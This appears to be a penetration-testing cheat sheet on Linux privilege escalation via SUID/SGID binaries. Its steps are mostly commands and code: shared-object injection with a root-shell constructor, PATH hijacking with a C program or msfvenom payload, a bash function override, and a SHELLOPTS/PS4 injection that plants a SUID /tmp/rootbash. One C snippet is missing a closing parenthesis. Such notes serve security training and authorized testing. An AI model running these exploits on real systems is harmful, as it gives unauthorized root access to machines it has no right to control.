---
title: SUID / SGID
parent: Method
layout: default
nav_order: 4
---

Cannot use `LD_PRELOAD` or `LD_LIBRARY_PATH` for SUID.

## Shell escape
1. Can find SUID and SGID files with this command:\
   `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
2. Check the shell escape at https://gtfobins.github.io/

## Known Exploits
1. Find SUID files:\
   `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
2. Check the version of the app (`--version` or `--help`)
3. Use `searchsploit appname version`
4. If got any `^M` character remove them, set executable `chmod +x esc.sh`
5. Execute to get root

## Shared Object Injection
1. Application will load shared objects required. So if we can know which shared objects not found we can replace them and get root if there is SUID.
2. Find SUID files:\
   `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
3. Run strace on the file (eg if we see /usr/local/bin/suid-so):\
   `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
4. If we see something like open(`"/home/user/bla/libcalc.so`) in directory we can write to, we can attempt to create the file.
5. Create the bla directory, and create the libcalc.c as below.
6. Compile libcalc.c into /home/user/bla/libcalc.so:\
   `gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c`
7. Run the SUID file:\
   `/usr/local/bin/suid-so`

libcalc.c
```
#include <stdio.h>
#include <stdlib.h>
​
static void inject() __attribute__((constructor));
void inject() {
    setuid(0);
    system("/bin/bash -p"
}
```

## PATH environmental variable
1. When programA (not script) try to run another programB, most likely name of programB is embedded in the executable file of programA as a string.
2. Find SUID files:\
   `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
3. Run `strings` on the suspicious app (for eg `strings /usr/local/bin/suid-env`). If you see something like `service apache2 start`, this app might be running service without a full path.
4. Can verify with strace:\
   `strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service`\
   or ltrace:\
   `ltrace /usr/local/bin/suid-env 2>&1 | grep service`
5. Since it runs service, create a service.c as below. (OR JUST CREATE A METERPRETER COMMAND AND RENAME IT!) For example:\
   `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf > xxx`\
   Download on the target, then `chmod 777 xxx`\
   Make sure the name is correct, then run step 7: `PATH=.:$PATH /usr/local/bin/vulnser`\
6. Compile service.c into service:\
   `gcc service.c -o outputfilename`
7. Prepend the current directory (where you compiled service) into PATH and execute SUID: `PATH=.:$PATH /usr/local/bin/suid-env`

service.c
```
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```

## Abusing Shell Feature 1
Only works on Bash < 4.2-048 (can define user function using a path name and even take priority)

1. Find SUID files:\
   `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
2. Run `strings` on the suspicious app (eg: `strings /usr/local/bin/suid-env2`). If you see results like `/usr/sbin/service apache2 start`, although service is full path, still possible vulnerable.
3. Verify with strace:\
   `strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service`\
   or ltrace:\
   `ltrace /usr/local/bin/suid-env2 2>&1 | grep service`
4. Ensure that bash is lower than 4.2-048\
   `bash --version`
5. Create a bash function with the name /usr/sbin/service and export the function:\
   `function /usr/sbin/service { /bin/bash -p; }`
   `export –f /usr/sbin/service`
6. Execute the SUID for root shell\
   `/usr/local/bin/suid-env2`

## Abusing Shell Feature 2
Debugging mode with SHELLOPTS

1. Find SUID files:\
   `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
2. Run `strings` on suspicious app (example `strings /usr/local/bin/suid-env2`). If you see results like `/usr/sbin/service apache2 start`, although service is full path, still possible vulnerable.
3. Verify with strace:\
   `strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service`\
   or ltrace:\
   `ltrace /usr/local/bin/suid-env2 2>&1 | grep service`
4. Run the SUID file with debugging and our payload:\
   `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2`
5. Run rootbash with -p to gain root shell:
   `/tmp/rootbash -p`